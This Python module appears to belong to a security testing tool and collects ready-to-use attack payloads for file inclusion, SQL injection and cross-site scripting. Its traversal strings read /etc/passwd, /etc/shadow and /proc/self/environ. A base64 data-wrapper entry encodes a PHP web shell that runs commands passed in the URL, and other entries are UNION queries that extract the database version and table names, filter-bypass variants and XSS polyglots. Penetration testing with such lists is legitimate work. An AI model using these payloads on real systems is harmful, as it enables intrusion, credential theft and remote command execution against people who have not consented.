"""Security testing payload reference collections."""

LFI_PAYLOADS = [
    {"name": "Linux passwd", "payload": "../../../../etc/passwd", "os": "linux"},
    {"name": "Linux shadow", "payload": "../../../../etc/shadow", "os": "linux"},
    {"name": "Windows hosts", "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "os": "windows"},
    {"name": "PHP filter base64", "payload": "php://filter/convert.base64-encode/resource=", "os": "any"},
    {"name": "PHP input", "payload": "php://input", "os": "any"},
    {"name": "Data wrapper", "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "os": "any"},
    {"name": "Null byte", "payload": "../../../../etc/passwd%00", "os": "linux"},
    {"name": "Double encoding", "payload": "%252e%252e%252f%252e%252e%252fetc/passwd", "os": "linux"},
    {"name": "Log poisoning (Apache)", "payload": "/var/log/apache2/access.log", "os": "linux"},
    {"name": "Log poisoning (Nginx)", "payload": "/var/log/nginx/access.log", "os": "linux"},
    {"name": "Proc self environ", "payload": "/proc/self/environ", "os": "linux"},
]

SQLI_PAYLOADS = [
    {"name": "Single quote test", "payload": "'", "category": "detection"},
    {"name": "OR 1=1", "payload": "' OR 1=1--", "category": "detection"},
    {"name": "AND 1=2", "payload": "' AND 1=2--", "category": "detection"},
    {"name": "Time-based blind", "payload": "' OR SLEEP(5)--", "category": "blind"},
    {"name": "Boolean-based blind", "payload": "' AND 1=1-- vs ' AND 1=2--", "category": "blind"},
    {"name": "UNION column count (1)", "payload": "' UNION SELECT NULL--", "category": "union"},
    {"name": "UNION column count (2)", "payload": "' UNION SELECT NULL,NULL--", "category": "union"},
    {"name": "UNION column count (3)", "payload": "' UNION SELECT NULL,NULL,NULL--", "category": "union"},
    {"name": "UNION extract version", "payload": "' UNION SELECT version(),NULL--", "category": "union"},
    {"name": "UNION extract tables", "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--", "category": "union"},
    {"name": "Space bypass (comments)", "payload": "'/**/OR/**/1=1--", "category": "waf_bypass"},
    {"name": "Case variation", "payload": "' oR 1=1--", "category": "waf_bypass"},
    {"name": "Double URL encode", "payload": "%2527%2520OR%25201%253D1--", "category": "waf_bypass"},
    {"name": "ExtractValue", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "category": "error_based"},
    {"name": "UpdateXML", "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--", "category": "error_based"},
]

XSS_PAYLOADS = [
    {"name": "Basic script", "payload": "<script>alert(1)</script>", "category": "reflected"},
    {"name": "Img onerror", "payload": "<img src=x onerror=alert(1)>", "category": "reflected"},
    {"name": "SVG onload", "payload": "<svg onload=alert(1)>", "category": "reflected"},
    {"name": "Event handler", "payload": "\" onfocus=alert(1) autofocus=\"", "category": "reflected"},
    {"name": "DOM XSS test", "payload": "javascript:alert(document.domain)", "category": "dom"},
    {"name": "Polyglot", "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", "category": "bypass"},
]

_PAYLOAD_MAP = {
    "lfi": LFI_PAYLOADS,
    "sqli": SQLI_PAYLOADS,
    "xss": XSS_PAYLOADS,
}


def get_payloads(payload_type: str) -> list[dict]:
    """Return payloads for a given type (lfi, sqli, xss). Empty list if unknown type."""
    return _PAYLOAD_MAP.get(payload_type.lower(), [])


def list_payload_types() -> list[str]:
    """Return available payload type keys."""
    return list(_PAYLOAD_MAP.keys())
